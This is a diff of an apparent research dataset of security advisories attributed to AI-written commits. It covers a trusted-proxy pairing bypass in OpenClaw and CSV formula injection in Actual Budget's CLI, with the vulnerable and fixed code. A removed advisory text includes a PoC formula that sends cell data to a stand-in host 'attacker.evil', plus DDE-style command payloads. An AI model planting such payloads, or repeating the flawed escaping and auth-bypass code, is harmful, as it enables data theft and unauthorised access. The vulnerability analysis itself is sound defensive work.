-      "code": "@@ -35,7 +35,11 @@ export function resolveControlUiAuthPolicy(params: {\n export function shouldSkipControlUiPairing(\n   policy: ControlUiAuthPolicy,\n   sharedAuthOk: boolean,\n+  trustedProxyAuthOk = false,\n ): boolean {\n+  if (trustedProxyAuthOk) {\n+    return true;\n+  }\n   return policy.allowBypass && sharedAuthOk;\n }\n \n@@ -50,6 +54,7 @@ export function evaluateMissingDeviceIdentity(params: {\n   role: GatewayRole;\n   isControlUi: boolean;\n   controlUiAuthPolicy: ControlUiAuthPolicy;\n+  trustedProxyAuthOk?: boolean;\n   sharedAuthOk: boolean;\n   authOk: boolean;\n   hasSharedAuth: boolean;\n@@ -58,6 +63,9 @@ export function evaluateMissingDeviceIdentity(params: {\n   if (params.hasDeviceIdentity) {\n     return { kind: \"allow\" };\n   }\n+  if (params.isControlUi && params.trustedProxyAuthOk) {\n+    return { kind: \"allow\" };\n+  }\n   if (params.isControlUi && !params.controlUiAuthPolicy.allowBypass) {\n     // Allow localhost Control UI connections when allowInsecureAuth is configured.\n     // Localhost has no network interception risk, and browser SubtleCrypto\n",
-      "file": "src/gateway/server/ws-connection/connect-policy.ts",
-      "role": "candidate"
-     },
-     {
-      "annotation": "The handler derived the trusted-proxy predicate from authentication success alone and fed it into both the pairing decision and the missing-device-identity check.",
-      "code": "@@ -427,11 +427,17 @@ export function attachGatewayWsMessageHandler(params: {\n           if (!device) {\n             clearUnboundScopes();\n           }\n+          const trustedProxyAuthOk =\n+            isControlUi &&\n+            resolvedAuth.mode === \"trusted-proxy\" &&\n+            authOk &&\n+            authMethod === \"trusted-proxy\";\n           const decision = evaluateMissingDeviceIdentity({\n             hasDeviceIdentity: Boolean(device),\n             role,\n             isControlUi,\n             controlUiAuthPolicy,\n+            trustedProxyAuthOk,\n             sharedAuthOk,\n             authOk,\n             hasSharedAuth,\n@@ -563,8 +569,13 @@ export function attachGatewayWsMessageHandler(params: {\n         // In that case, don't force device pairing on first connect.\n         const skipPairingForOperatorSharedAuth =\n           role === \"operator\" && sharedAuthOk && !isControlUi && !isWebchat;\n+        const trustedProxyAuthOk =\n+          isControlUi &&\n+          resolvedAuth.mode === \"trusted-proxy\" &&\n+          authOk &&\n+          authMethod === \"trusted-proxy\";\n         const skipPairing =\n-          shouldSkipControlUiPairing(controlUiAuthPolicy, sharedAuthOk) ||\n+          shouldSkipControlUiPairing(controlUiAuthPolicy, sharedAuthOk, trustedProxyAuthOk) ||\n           skipPairingForOperatorSharedAuth;\n         if (device && devicePublicKey && !skipPairing) {\n           const formatAuditList = (items: string[] | undefined): string => {\n",
-      "file": "src/gateway/server/ws-connection/message-handler.ts",
-      "role": "candidate"
-     },
-     {
-      "annotation": "The repair deletes the early return and the scope exemption, so a proxy-authenticated connection must pair before its scopes are honored and unbound scopes are cleared again.",
-      "code": "@@ -37,13 +37,10 @@ export function resolveControlUiAuthPolicy(params: {\n export function shouldSkipControlUiPairing(\n   policy: ControlUiAuthPolicy,\n   role: GatewayRole,\n-  trustedProxyAuthOk = false,\n+  _trustedProxyAuthOk = false,\n   authMode?: string,\n   authMethod?: string,\n ): boolean {\n-  if (trustedProxyAuthOk) {\n-    return true;\n-  }\n   if (policy.isControlUi && role === \"operator\" && authMethod === \"tailscale\" && policy.device) {\n     return true;\n   }\n@@ -96,9 +93,6 @@ export function shouldClearUnboundScopesForMissingDeviceIdentity(params: {\n     params.decision.kind !== \"allow\" ||\n     (!params.controlUiAuthPolicy.allowBypass &&\n       !params.preserveInsecureLocalControlUiScopes &&\n-      params.trustedProxyAuthOk !== true &&\n-      // trusted-proxy auth can bypass pairing for some clients, but those\n-      // self-declared scopes are still unbound without device identity.\n       (params.authMethod === \"token\" ||\n         params.authMethod === \"password\" ||\n         params.authMethod === \"trusted-proxy\"))\n",
-      "file": "src/gateway/server/ws-connection/connect-policy.ts",
-      "role": "fix"
-     },
-     {
-      "annotation": "Device-token issuance is now gated on the absence of trusted-proxy authentication, so a live proxy connection cannot obtain a token without a paired device identity.",
-      "code": "@@ -1285,8 +1285,9 @@ export function attachGatewayWsMessageHandler(params: GatewayWsMessageHandlerPar\n           }\n         }\n \n+        const shouldIssueDeviceToken = !trustedProxyAuthOk;\n         const deviceToken =\n-          device && hasServerApprovedDeviceTokenBaseline\n+          shouldIssueDeviceToken && device && hasServerApprovedDeviceTokenBaseline\n             ? await ensureDeviceToken({ deviceId: device.id, role, scopes })\n             : null;\n         const bootstrapDeviceTokens: Array<{\n",
-      "file": "src/gateway/server/ws-connection/message-handler.ts",
-      "role": "fix"
-     }
-    ],
-    "fix_patch_sha256": "73bbdf81133ae30c198e9c4dd0c67546f6896caa74560a7baceae59dcd8d2247",
-    "fix_url": "https://github.com/openclaw/openclaw/commit/96fba91b3a51d6e536f03a4077ef8a11a132578d",
-    "steps": [
-     {
-      "detail": "The change that let trusted-proxy authentication skip device pairing added the proxy arm to the pairing decision, the early return that made any trusted-proxy Control UI connection pairing-bypass eligible, and the matching allow in the missing-device-identity check. Its message ends with a Cursor co-author trailer.",
-      "title": "AI change"
-     },
-     {
-      "detail": "The repair removes the pairing bypass and the scope exemption, clears self-declared scopes when no device identity exists, and stops issuing device tokens on the trusted-proxy path, so pairing now comes before proxy-scoped access.",
-      "title": "Fix"
-     }
-    ],
-    "summary": "Openclaw 2026.2.24 through 2026.5.12 treated successful trusted-proxy authentication as enough to skip device pairing, so a restricted or unpaired Control UI client could keep the operator scopes it declared on connect and use admin-only gateway calls on that connection; 2026.5.18 requires pairing first."
-   },
-   "ir_chain": {
-    "original_advisory_ids": [
-     "GHSA-QJPC-QF9M-XWMR"
-    ],
-    "original_mechanism": "A Control UI session behind a trusted reverse proxy still had to complete device pairing before its requested scopes were trusted, which is the behaviour issue #25293 asked to change.",
-    "original_sink": "websocket connect policy in src/gateway/server/ws-connection/connect-policy.ts and message-handler.ts",
-    "original_author_kind": "AI",
-    "original_author_name": "Cursor",
-    "original_sha": "20523b918adff4feae378ac9965e204c56b6e3d8",
-    "unresolved_reason": null,
-    "attempted_remediation": {
-     "candidate_shas": [
-      "20523b918adff4feae378ac9965e204c56b6e3d8"
-     ],
-     "changed": "Let a successful trusted-proxy authentication skip device pairing: shouldSkipControlUiPairing returned true, the missing-device-identity check answered allow, and the scopes the client declared on connect survived.",
-     "missed": "Dropped the pairing baseline for scope binding on the whole trusted-proxy path; the role gate added two days later (ec45c317, requiring role === 'operator') narrowed the bypass and left the same pre-pairing path open for operator-role sessions."
-    },
-    "residual_bypass": "An unpaired operator-role Control UI session behind a trusted proxy kept the scopes it declared on connect and could exercise admin-gated gateway calls; v2026.5.12 still carried the pairing-skip early return, the scope exemption and the allow.",
-    "final_closure": {
-     "closed": "Removed the proxy pairing bypass, required pairing before proxy-scoped access, cleared unbound scopes and stopped issuing device tokens without a paired device identity.",
-     "minimum_fix_shas": [
-      "96fba91b3a51d6e536f03a4077ef8a11a132578d"
-     ]
-    }
-   },
+   "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-qjpc-qf9m-xwmr",
-   "publication_issues": [],
-   "publication_status": "confirmed"
+   "publication_issues": [
+    "missing_fix_authorship"
+   ],
+   "publication_status": "provisional"
   },
   {
    "case_id": "GHSA-QCR8-X557-7CP3",
@@ -18836,30 +18826,43 @@
    },
    "contribution_class": "AI_DIRECT_ROOT",
    "candidate_set": [
+    "c4de834f9835ef8ae170ed34468b3e1ce2dbb040"
+   ],
+   "carrier_set": [
     "a43b6f5c4714fb08b3fe3e5ce560213b229648c1"
    ],
-   "carrier_set": [],
    "minimum_fix_set": [
-    "068185751c03b42e726e3c60b718413d5f96c306"
+    "48699c46b1b5cc296bc76dd637edb47b0c02d926",
+    "24a549a8e1f471b6f64b14c15d7fc2540e3b29b3"
    ],
    "gates": {
-    "identity": "PASS",
-    "ai_hunk": "PASS",
-    "topology": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "release": "PASS",
-    "uniqueness": "PASS"
+    "ai_hunk": "UNKNOWN",
+    "but_for": "UNKNOWN",
+    "fix_reversal": "UNKNOWN",
+    "identity": "UNKNOWN",
+    "release": "UNKNOWN",
+    "topology": "UNKNOWN",
+    "uniqueness": "UNKNOWN"
    },
    "vulnerable_release": {
-    "kind": "git_tag_and_npm_tarball",
-    "sha": "5b8382934ab10f7ee3fb2bef301152e07f68ab2d",
-    "tag": "v26.5.2"
+    "kind": "verified_source_versions",
+    "version": "26.4.0, 26.5.0, 26.5.1, 26.5.2",
+    "tag": null,
+    "versions": [
+     "26.4.0",
+     "26.5.0",
+     "26.5.1",
+     "26.5.2"
+    ],
+    "qualification": "CLI absent at v26.3.0; do not apply the advisory range to all earlier Actual app releases. Nightlies not exhaustively enumerated."
    },
    "fixed_release": {
-    "kind": "git_tag_and_npm_tarball",
-    "sha": "3a730c160f8e6e4ea68f191d075a46bbbb7073d8",
-    "tag": "v26.6.0"
+    "kind": "source_and_npm_artifact",
+    "tag": null,
+    "version": "26.6.0",
+    "tag_commit": "3a730c160f8e6e4ea68f191d075a46bbbb7073d8",
+    "source_blob": "312c5058d722c96930df86d775bd9d62eec4df56",
+    "artifact": "Published @actual-app/cli 26.6.0 archive; registry SHA512 matched independently by adjudicator."
    },
    "published_at": "2026-06-22",
    "severity": "MEDIUM",
@@ -18867,7 +18870,7 @@
     "CWE-1236",
     "CWE-1236: IMPROPER NEUTRALIZATION OF FORMULA ELEMENTS IN A CSV FILE"
    ],
-   "description": "## Summary\n\n`@actual-app/cli` ships a hand-rolled CSV serializer in `packages/cli/src/output.ts` (used whenever the global `--format csv` option is passed) whose `escapeCsv` helper only handles RFC 4180 delimiter/quote/newline escaping. It does **not** neutralize the standard CSV formula-injection prefixes (`=`, `+`, `-`, `@`, `\\t`, `\\r`). Any CLI command that streams an object array containing user-controlled strings — `transactions list`, `accounts list`, `payees list`, `categories list`, `tags list`, `category-groups list`, `rules list`, `schedules list`, `query` — will emit cells that auto-evaluate when the resulting CSV is opened in Excel, LibreOffice Calc, or Google Sheets, enabling data exfiltration (`=HYPERLINK(...)`, `=WEBSERVICE(...)`) and arbitrary formula execution.\n\nThis is a **distinct variant** of the formula-injection surface in `packages/loot-core/src/server/transactions/export/export-to-csv.ts` (which uses `csv-stringify` and would need a separate `cast` option fix) — they are different files, different packages, and different serializers. Fixing one does not fix the other.\n\n## Details\n\n### Vulnerable code\n\n`packages/cli/src/output.ts:98-103`:\n\n```ts\nfunction escapeCsv(value: string): string {\n if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n return '\"' + value.replace(/\"/g, '\"\"') + '\"';\n }\n return value;\n}\n```\n\nThe helper performs only delimiter/quote/newline neutralization, which is sufficient for RFC 4180 *parsing* but irrelevant to spreadsheet *formula evaluation*. CSV double-quoting is invisible to Excel/Calc/Sheets — the unquoted cell value `=HYPERLINK(\"http://attacker/?d=\"&B2,\"Click\")` is still parsed as a formula by the spreadsheet, even when wrapped as `\"=HYPERLINK(\"\"http://attacker/?d=\"\"&B2,\"\"Click\"\")\"` on disk.\n\n### Data flow to the sink\n\n1. The global `--format` option is registered at `packages/cli/src/index.ts:53-57` with `choices(['json','table','csv'])` and applies to every subcommand.\n2. List/query subcommands invoke `printOutput(data, format)` (`output.ts:105-107`), which routes `format === 'csv'` to `formatCsv` (`output.ts:71-96`).\n3. For each row, every column is run through `formatCellValue` (`output.ts:21-26`):\n ```ts\n function formatCellValue(key: string, value: unknown): string {\n if (isAmountValue(key, value)) {\n return (value / 100).toFixed(2);\n }\n return String(value ?? '');\n }\n ```\n Only the fixed `AMOUNT_FIELDS` set (`amount`, `balance`, `budgeted`, etc.) gets numeric coercion. User-controlled string fields — `payee.name`, `account.name`, `category.name`, `notes`, tag names, rule descriptions, schedule names — are passed verbatim to `escapeCsv`.\n4. `escapeCsv` returns the value unmodified unless it contains `,`, `\"`, or `\\n`. A payload such as `=1+1`, `@SUM(...)`, `+1+cmd|'/c calc'!A0`, or `-2+3+cmd|'/c calc'!A0` therefore lands in the output as a leading-character formula.\n\n### Exploitability conditions\n\n- The CLI is installed and used by the victim (`@actual-app/cli` is published with `\"bin\": { \"actual\": \"./dist/cli.js\", \"actual-cli\": \"./dist/cli.js\" }`).\n- The attacker can persist a malicious string in any user-controlled field of the budget. Realistic vectors:\n - Co-user / co-collaborator of a synced budget (multi-device, or attacker-controlled sync server).\n - Sending the victim a crafted OFX/QIF/CSV import file.\n - API write access (e.g., over a compromised sync session).\n- The victim runs `actual <list-cmd> --format csv > out.csv` and opens `out.csv` in a spreadsheet program. CSV files generated locally by the CLI are not gated by Office Protected View / Mark-of-the-Web, so formulas evaluate immediately.\n\nThere are **no mitigations** in the code path: no allowlist, no sanitizer, no `cast` option, no warning, and the CLI is shipped to end users via npm.\n\n## PoC\n\nSetup (one-time — choose any user-controlled field; payee shown):\n\n```bash\n# Inject via the CLI's own write path (or via OFX/QIF/CSV import, or shared sync):\nactual transactions add \\\n --account \"$ACCOUNT_ID\" \\\n --data '[{\"payee_name\":\"=HYPERLINK(\\\"http://attacker.evil/leak?d=\\\"&B2,\\\"Bank refund\\\")\",\"date\":\"2026-01-01\",\"amount\":10000}]'\n```\n\nTrigger (victim runs):\n\n```bash\nactual transactions list --account \"$ACCOUNT_ID\" --start 2026-01-01 --end 2026-12-31 --format csv > out.csv\ncat out.csv\n```\n\nObserved output (abridged; quoting is RFC 4180-correct but the formula prefix is preserved):\n\n```\nid,date,amount,payee,notes,category,account,cleared,reconciled\nabc...,2026-01-01,100.00,\"=HYPERLINK(\"\"http://attacker.evil/leak?d=\"\"&B2,\"\"Bank refund\"\")\",,,Checking,false,false\n```\n\nOpen `out.csv` in Excel / LibreOffice Calc / Google Sheets → the `payee` cell renders as a clickable hyperlink that, when clicked (or auto-fetched in some configurations), exfiltrates neighboring cell content (`B2` = the date, but trivially adjustable to any cell) to the attacker.\n\nMinimal-payload variants that bypass `escapeCsv` entirely (no `,`, `\"`, or `\\n` → no quoting at all):\n\n- Payee name `=1+1` → cell shows `2`.\n- Payee name `@SUM(1+1)` → cell shows `2`.\n- Payee name `+1+1` → cell shows `2`.\n- Payee name `-2+3` → cell shows `1`.\n\nThe same applies to other list commands sharing the global `--format` option:\n\n```bash\nactual accounts list --format csv # account.name\nactual payees list --format csv # payee.name\nactual categories list --format csv # category.name\nactual tags list --format csv\nactual category-groups list --format csv\nactual rules list --format csv\nactual schedules list --format csv\nactual query \"...\" --format csv\n```\n\nVerified by reading `escapeCsv` (`packages/cli/src/output.ts:98-103`): the only escape triggers are `,`, `\"`, `\\n`, and even when triggered the leading character is preserved.\n\n## Impact\n\n- **Data exfiltration** in the victim's spreadsheet context via `=HYPERLINK(...)`, `=WEBSERVICE(...)`, `=IMPORTXML(...)` (Sheets), `=IMPORTDATA(...)` (Sheets) — typically one click for HYPERLINK, fully automatic for WEBSERVICE/IMPORT* on confirmation. Victim's financial data (account names, balances, transactions in adjacent cells) is the natural exfil target.\n- **Arbitrary formula execution** in the victim's spreadsheet context, including legacy DDE-style payloads on outdated Excel installations (potential RCE).\n- **Trust-boundary crossing**: financial data the victim assumes is \"exported\" becomes attacker-controlled active content. The CLI is the victim's own trusted tool; users do not expect `actual transactions list --format csv` to produce a file that runs code.\n\nBlast radius is bounded by the requirement that the attacker plant a string in a user-controlled field and the victim opens the CSV in a spreadsheet — but both are realistic for a personal-finance app whose primary export workflow is \"open in Excel\".\n\n## Recommended Fix\n\nNeutralize formula-trigger prefixes in `escapeCsv` *before* the existing RFC 4180 quoting. Example:\n\n```ts\n// packages/cli/src/output.ts\nconst FORMULA_TRIGGERS = /^[=+\\-@\\t\\r]/;\n\nfunction escapeCsv(value: string): string {\n // Neutralize spreadsheet formula prefixes (CWE-1236).\n if (FORMULA_TRIGGERS.test(value)) {\n value = \"'\" + value;\n }\n if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n return '\"' + value.replace(/\"/g, '\"\"') + '\"';\n }\n return value;\n}\n```\n\nThe leading single-quote is the OWASP-recommended neutralizer: it is stripped by Excel/Calc on display but prevents formula evaluation. Apply the same fix in `packages/loot-core/src/server/transactions/export/export-to-csv.ts` by passing a `cast` option to `csv-stringify` that prepends `'` to any string starting with a formula trigger — the two sites are independent and both must be patched.",
+   "description": "An AI-assisted CLI serializer exported stored budget strings with CSV syntax escaping but without neutralizing spreadsheet formulas. A person able to write data used by a victim could influence exported cells if the victim chose CSV and imported it with formula evaluation enabled. This does not establish CLI execution, automatic disclosure, or universal spreadsheet behavior. The repair combines type-aware formula neutralization with carriage-return quoting. Source releases 26.4.0, 26.5.0, 26.5.1 and 26.5.2 were checked as affected, and the repaired source and published CLI 26.6.0 package were verified.",
    "references": [
     "https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq",
     "https://github.com/actualbudget/actual",
@@ -18875,7 +18878,7 @@
     "https://github.com/actualbudget/actual/commit/068185751c03b42e726e3c60b718413d5f96c306",
     "https://github.com/actualbudget/actual/releases/tag/v26.6.0"
    ],
-   "mechanism": "Claude-authored CLI commit creates --format csv and escapeCsv that only handles RFC 4180 quoting. Parent has no packages/cli/src/output.ts. Minimum fix member prefixes formula-trigger cells before escaping.",
+   "mechanism": "An AI-assisted CLI serializer exported stored budget strings with CSV syntax escaping but without neutralizing spreadsheet formulas. A person able to write data used by a victim could influence exported cells if the victim chose CSV and imported it with formula evaluation enabled. This does not establish CLI execution, automatic disclosure, or universal spreadsheet behavior.",
    "cause_category": "injection",
    "ai_provenance": {
     "family": "claude",
@@ -18883,89 +18886,63 @@
     "candidate_count": 1,
     "named_candidate_count": 1
    },
-   "fix_authorship": {
-    "classification": "ai_assisted",
-    "families": [
-     "claude_code"
-    ],
-    "fixes": [
-     {
-      "author": {
-       "email": "matiss@mja.lv",
-       "name": "Matiss Janis Aboltins"
-      },
-      "authored_at": "2026-05-16T22:05:40+01:00",
-      "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "claude_code",
-        "kind": "coauthor_trailer",
-        "text": "Co-authored-by: Claude <noreply@anthropic.com>"
-       }
-      ],
-      "families": [
-       "claude_code"
-      ],
-      "sha": "068185751c03b42e726e3c60b718413d5f96c306"
-     }
-    ]
-   },
+   "fix_authorship": null,
    "code_evidence": {
-    "candidate_patch_sha256": "d01c631894df984a55760584f4bffdf68bfc3e0803f67dc7a6fc0acdd30d7272",
+    "summary": "An AI-assisted CLI serializer exported stored budget strings with CSV syntax escaping but without neutralizing spreadsheet formulas. A person able to write data used by a victim could influence exported cells if the victim chose CSV and imported it with formula evaluation enabled. This does not establish CLI execution, automatic disclosure, or universal spreadsheet behavior. The repair combines type-aware formula neutralization with carriage-return quoting. Source releases 26.4.0, 26.5.0, 26.5.1 and 26.5.2 were checked as affected, and the repaired source and published CLI 26.6.0 package were verified.",
+    "candidate_url": "https://github.com/actualbudget/actual/commit/c4de834f9835ef8ae170ed34468b3e1ce2dbb040",
+    "advisory_url": "https://github.com/advisories/ghsa-7gh7-258j-4mpq",
+    "annotation_mode": "hunk_specific",
     "display_hunks": [
      {
       "file": "packages/cli/src/output.ts",
-      "code": "diff --git a/packages/cli/src/output.ts b/packages/cli/src/output.ts\nnew file mode 100644\nindex 0000000..1693885af09a2c0af92712837d9b69483ffdf0ce\n--- /dev/null\n+++ b/packages/cli/src/output.ts\n@@ -0,0 +48,31 @@\n+function formatCsv(data: unknown): string {\n+  if (!Array.isArray(data)) {\n+    if (data && typeof data === 'object') {\n+      const entries = Object.entries(data);\n+      const header = entries.map(([k]) => escapeCsv(k)).join(',');\n+      const values = entries.map(([, v]) => escapeCsv(String(v))).join(',');\n+      return header + '\\n' + values;\n+    }\n+    return String(data);\n+  }\n+\n+  if (data.length === 0) {\n+    return '';\n+  }\n+\n+  const keys = Object.keys(data[0] as Record<string, unknown>);\n+  const header = keys.map(k => escapeCsv(k)).join(',');\n+  const rows = data.map(row => {\n+    const r = row as Record<string, unknown>;\n+    return keys.map(k => escapeCsv(String(r[k] ?? ''))).join(',');\n+  });\n+\n+  return [header, ...rows].join('\\n');\n+}\n+\n+function escapeCsv(value: string): string {\n+  if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n+    return '\"' + value.replace(/\"/g, '\"\"') + '\"';\n+  }\n+  return value;\n+}",
-      "annotation": "The new CSV formatter quotes values with RFC 4180 escaping but interpolates cell text straight into the output file, so values that begin with an equals sign or plus are interpreted as live spreadsheet formulas when the file is opened.",
-      "role": "candidate"
+      "role": "candidate",
+      "code": "@@ -0,0 +57,26 @@\n+  }\n+\n+  if (data.length === 0) {\n+    return '';\n+  }\n+\n+  const keys = Object.keys(data[0] as Record<string, unknown>);\n+  const header = keys.map(k => escapeCsv(k)).join(',');\n+  const rows = data.map(row => {\n+    const r = row as Record<string, unknown>;\n+    return keys.map(k => escapeCsv(String(r[k] ?? ''))).join(',');\n+  });\n+\n+  return [header, ...rows].join('\\n');\n+}\n+\n+function escapeCsv(value: string): string {\n+  if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n+    return '\"' + value.replace(/\"/g, '\"\"') + '\"';\n+  }\n+  return value;\n+}\n+\n+export function printOutput(data: unknown, format: OutputFormat = 'json') {\n+  process.stdout.write(formatOutput(data, format) + '\\n');\n+}\n",
+      "annotation": "The original CLI serializer escapes CSV delimiters and quotes but leaves formula-significant string content active for a formula-enabled spreadsheet import.",
+      "source_url": "https://github.com/actualbudget/actual/commit/c4de834f9835ef8ae170ed34468b3e1ce2dbb040"
      },
      {
       "file": "packages/cli/src/output.ts",
-      "code": "diff --git a/packages/cli/src/output.ts b/packages/cli/src/output.ts\nindex c2b65d9d6..312c5058d 100644\n--- a/packages/cli/src/output.ts\n+++ b/packages/cli/src/output.ts\n@@ -76,3 +76 @@ function formatCsv(data: unknown): string {\n-      const values = entries\n-        .map(([k, v]) => escapeCsv(formatCellValue(k, v)))\n-        .join(',');\n+      const values = entries.map(([k, v]) => formatCsvCell(k, v)).join(',');\n@@ -92 +90 @@ function formatCsv(data: unknown): string {\n-    return keys.map(k => escapeCsv(formatCellValue(k, r[k]))).join(',');\n+    return keys.map(k => formatCsvCell(k, r[k])).join(',');\n@@ -97,0 +96,12 @@ function formatCsv(data: unknown): string {\n+const FORMULA_TRIGGERS = /^[=+\\-@\\t\\r]/;\n+\n+function formatCsvCell(key: string, value: unknown): string {\n+  let formatted = formatCellValue(key, value);\n+  if (typeof value !== 'number' && FORMULA_TRIGGERS.test(formatted)) {\n+    formatted = \"'\" + formatted;\n+  }\n+  return escapeCsv(formatted);\n+}\n+\n@@ -99 +109,6 @@ function escapeCsv(value: string): string {\n-  if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n+  if (\n+    value.includes(',') ||\n+    value.includes('\"') ||\n+    value.includes('\\n') ||\n+    value.includes('\\r')\n+  ) {",
-      "annotation": "formatCsvCell now prefixes any non-numeric cell that starts with a formula trigger character with a single quote, and escaping also covers carriage returns. CSV produced by the CLI command can no longer execute formulas in a spreadsheet.",
-      "role": "fix"
+      "role": "fix",
+      "code": "@@ -89,10 +91,24 @@\n   const header = keys.map(k => escapeCsv(k)).join(',');\n   const rows = data.map(row => {\n     const r = row as Record<string, unknown>;\n-    return keys.map(k => escapeCsv(formatCellValue(k, r[k]))).join(',');\n+    return keys.map(k => escapeCsvCell(formatCellValue(k, r[k]))).join(',');\n   });\n \n   return [header, ...rows].join('\\n');\n+}\n+\n+// Characters that trigger formula evaluation in Excel / LibreOffice Calc /\n+// Google Sheets when they appear at the start of a cell. Prefixing such a\n+// value with a single quote neutralizes the formula (OWASP-recommended;\n+// CWE-1236). We skip neutralization for values that originated as numbers,\n+// since negative amounts like \"-25.00\" would otherwise be quoted as text.\n+const FORMULA_TRIGGERS = /^[=+\\-@\\t\\r]/;\n+\n+function escapeCsvCell({ value, isNumeric }: FormattedCell): string {\n+  if (!isNumeric && FORMULA_TRIGGERS.test(value)) {\n+    value = \"'\" + value;\n+  }\n+  return escapeCsv(value);\n }\n \n function escapeCsv(value: string): string {\n",
+      "annotation": "The first repair member neutralizes formula-significant strings while retaining numeric values as numbers.",
+      "source_url": "https://github.com/actualbudget/actual/commit/48699c46b1b5cc296bc76dd637edb47b0c02d926"
      },
      {
-      "file": "packages/loot-core/src/server/transactions/export/export-to-csv.ts",
-      "code": "diff --git a/packages/loot-core/src/server/transactions/export/export-to-csv.ts b/packages/loot-core/src/server/transactions/export/export-to-csv.ts\nindex 01ff009bd..dc01b6f22 100644\n--- a/packages/loot-core/src/server/transactions/export/export-to-csv.ts\n+++ b/packages/loot-core/src/server/transactions/export/export-to-csv.ts\n@@ -6,0 +7,10 @@ import { integerToAmount } from '#shared/util';\n+const FORMULA_TRIGGERS = /^[=+\\-@\\t\\r]/;\n+\n+const csvStringifyOptions = {\n+  header: true,\n+  cast: {\n+    string: (value: string) =>\n+      FORMULA_TRIGGERS.test(value) ? \"'\" + value : value,\n+  },\n+};\n+\n@@ -56 +66 @@ export async function exportToCSV(\n-  return csvStringify(transactionsForExport, { header: true });\n+  return csvStringify(transactionsForExport, csvStringifyOptions);\n@@ -131 +141 @@ export async function exportQueryToCSV(query) {\n-  return csvStringify(transactionsForExport, { header: true });\n+  return csvStringify(transactionsForExport, csvStringifyOptions);",
-      "annotation": "The server-side transaction export applies the same formula-trigger guard through a custom string cast, ensuring the JSON-to-CSV pipeline that serves the transaction export is equally protected against formula injection.",
-      "role": "fix"
+      "file": "packages/cli/src/output.ts",
+      "role": "fix",
+      "code": "@@ -106,7 +106,12 @@\n }\n \n function escapeCsv(value: string): string {\n-  if (value.includes(',') || value.includes('\"') || value.includes('\\n')) {\n+  if (\n+    value.includes(',') ||\n+    value.includes('\"') ||\n+    value.includes('\\n') ||\n+    value.includes('\\r')\n+  ) {\n     return '\"' + value.replace(/\"/g, '\"\"') + '\"';\n   }\n   return value;\n",
+      "annotation": "The closing repair member also quotes carriage returns so a neutralized value remains within its CSV cell.",
+      "source_url": "https://github.com/actualbudget/actual/commit/24a549a8e1f471b6f64b14c15d7fc2540e3b29b3"
      }
     ],
-    "fix_marker": null,
-    "candidate_url": "https://github.com/actualbudget/actual/commit/a43b6f5c4714fb08b3fe3e5ce560213b229648c1",
-    "fix_url": "https://github.com/actualbudget/actual/commit/068185751c03b42e726e3c60b718413d5f96c306",
-    "advisory_url": "https://github.com/advisories/ghsa-7gh7-258j-4mpq",
-    "summary": "AI-written CSV escaping only quoted delimiters and newlines, allowing formula-injection payloads in CLI output to execute when opened in spreadsheets.",
-    "steps": [
-     {
-      "detail": "[AI] Experimental CLI tool for Actual (#7208)",
-      "title": "AI change"
-     },
-     {
-      "detail": "[AI] Prevent CSV formula injection in exports and CLI output (#7859)",
-      "title": "Fix"
-     }
-    ],
-    "fix_patch_sha256": "7619975b1c72c42cfb95d8f94475a7346f80d51270d0e6ebe74e35826fdea714",
-    "annotation_mode": "hunk_specific",
+    "candidate_patch_sha256": "7545a6392b8415d9a73f20817646a5a22b1044f2295628dcdd10379400cfaa07",
     "required_anchors": {
      "candidate": [
-      "formatCsv",
       "escapeCsv"
      ],
      "fix": [
-      "FORMULA_TRIGGERS",
-      "formatCsvCell"
+      "FORMULA_TRIGGERS"
      ]
     },
-    "mechanism": "Claude-authored CLI commit creates --format csv and escapeCsv that only handles RFC 4180 quoting. Parent has no packages/cli/src/output.ts. Minimum fix member prefixes formula-trigger cells before escaping."
+    "fix_url": "https://github.com/actualbudget/actual/commit/48699c46b1b5cc296bc76dd637edb47b0c02d926",
+    "fix_files": [
+     "packages/cli/src/output.ts"
+    ],
+    "fix_patch_sha256": "0d1110506b53e78cd734da22bd3c5251bdb7900789ad0489a1a45e117c18a653",
+    "steps": [
+     {
+      "title": "fix",
+      "detail": "The repair combines type-aware formula neutralization with carriage-return quoting. Source releases 26.4.0, 26.5.0, 26.5.1 and 26.5.2 were checked as affected, and the repaired source and published CLI 26.6.0 package were verified."
+     }
+    ]
    },
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-7gh7-258j-4mpq",
-   "publication_issues": [],
-   "publication_status": "confirmed"
+   "publication_issues": [
+    "missing_fix_authorship"
+   ],
+   "publication_status": "provisional"
   },
   {
    "case_id": "GHSA-VCV2-R9JH-99M5",
@@ -32292,39 +32269,44 @@
     "language": "Python",
     "archived": false
    },
-   "contribution_class": "AI_CODE_FLAWED",
+   "contribution_class": "AI_DIRECT_ROOT",
    "candidate_set": [
     "358e4c5c585ddfb0ff983d5f40ddf5ab3f407e1c"
    ],
-   "carrier_set": [],
+   "carrier_set": [
+    "933d64020f07658befff1ecc1f7a9ee7b48860dc"
+   ],
    "minimum_fix_set": [
     "29e46f3737b15f6045073fb145ec936499e232f6"
    ],
    "gates": {
-    "ai_hunk": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "identity": "PASS",
-    "release": "PASS",
-    "topology": "PASS",
-    "uniqueness": "PASS"
+    "ai_hunk": "UNKNOWN",
+    "but_for": "UNKNOWN",
+    "fix_reversal": "UNKNOWN",
+    "identity": "UNKNOWN",
+    "release": "UNKNOWN",
+    "topology": "UNKNOWN",
+    "uniqueness": "UNKNOWN"
    },
    "vulnerable_release": {
-    "kind": "advisory_range",
-    "tag": null,
-    "version": "= 2.1.0"
+    "kind": "git_tag",
+    "version": "2.1.0",
+    "tag": "2.1.0",
+    "sha": "43c81f62328e2f782848dcc348a3862c6f0d1aad"
    },
    "fixed_release": {
-    "kind": "advisory_version",
-    "tag": null,
-    "version": "2.1.1"
+    "kind": "git_tag",
+    "version": "2.1.1",
+    "tag": "2.1.1",
+    "sha": "c5d04b12ceebdc22942439bddd92dc70e8cd6cd0",
